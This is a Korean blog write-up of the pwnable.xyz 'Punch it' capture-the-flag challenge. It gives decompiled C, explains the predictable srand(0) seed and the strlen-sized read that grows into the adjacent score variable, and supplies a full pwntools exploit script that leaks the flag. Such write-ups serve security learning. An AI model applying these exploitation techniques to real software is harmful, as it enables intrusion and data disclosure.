---
title: "[pwnable.xyz]Punch it"
date: 2020-2-1
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

와 진짜 이 문제 서버로 전송하는 게 너무 많아서 서버가 미국 서부에 있다길래 로스엔젤레스 서버 하나 파서 풀었다.. 확실히 한국에서 돌리면 시간 초과되거나 중간에 서버 죽는데 미국서버 파서 돌리니까 20초면 풀린다.. 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  unsigned int input; // [rsp+0h] [rbp-10h]
  unsigned int rand_value; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+8h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setup();
  motd_select_character();
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        printf("score: %ld\n", score);
        printf("gimmi pawa> ");
        input = 0;
        rand_value = rand();
        _isoc99_scanf("%u", &input);
        getchar();
        if ( input != rand_value )
          break;
        puts("draw");
        printf("Save? [N/y]", &input);
        if ( getchar() == 'y' )
        {
          printf("Name: ");
          v3 = strlen(buf);
          read(0, buf, v3);
        }
      }
      if ( input <= rand_value )
        break;
      ++score;
    }
  }
  while ( input >= rand_value );
  printf("Sowwy, pleya %s luse, bay bay", buf);
  return 0;
}
```

`motd_select_character` 함수에서 srand() 값 설정할 수 있는데 1~4번까지 메뉴는 urandom값을 가져와서 전역변수에 저장하는데 그 이외 번호 누르면 그냥 srand(0)이 들어간다. 

이 문제는 마지막에 입력 값이 랜덤 값보다 작으면 buf 출력해주는데 여기서 buf와 score를 쭉 채워버리면 printf할 때 flag까지 출력되버리게 하면된다.

메인에 잘보면 buf크기만큼 또 buf에 입력받을 수 있다. buf변수와 score 변수가 붙어있으므로 score를 늘려버리면 buf크기도 늘어난다. 이를 이용해서 계속 score를 널 바이트 없을 때까지 채워버리면 된다. 그리고 랜덤값보다 작은 값 입력해버리면 buf출력되면서 score, flag까지 출력된다.

```
v3 = strlen(buf);
read(0, buf, v3);
```

그냥 디버깅하면서 값 들어가는 거 보면서 풀었다.

> exploit.py

```python
from pwn import *
from ctypes import *

context.log_level = 'debug'
#e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30024)
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

sla(':','Y')
sa(':','A'*44)
sa('>','9')
lib.srand(0)
score = 0

def f():
	p.recvuntil('score: ')
	score = int(p.recvline().strip())
	log.info('score : {}'.format(score))
	rand = lib.rand()
	log.info('rand : {}'.format(rand))
	sla('>',str(0xffffffff))

def g(name):
	p.recvuntil('score: ')
	score = int(p.recvline().strip())
	log.info('score : {}'.format(score))
	rand = lib.rand()
	log.info('rand : {}'.format(rand))
	sla('>',str(rand))
	sa('Save? [N/y]','y')
	sa(':',name)

def lose():
	p.recvuntil('score: ')
	score = int(p.recvline().strip())
	log.info('score : {}'.format(score))
	rand = lib.rand()
	log.info('rand : {}'.format(rand))
	sla('>',str(0))

if __name__ == '__main__':
	f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*50);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*51);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*50);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f();
	lose();

	p.interactive()
```

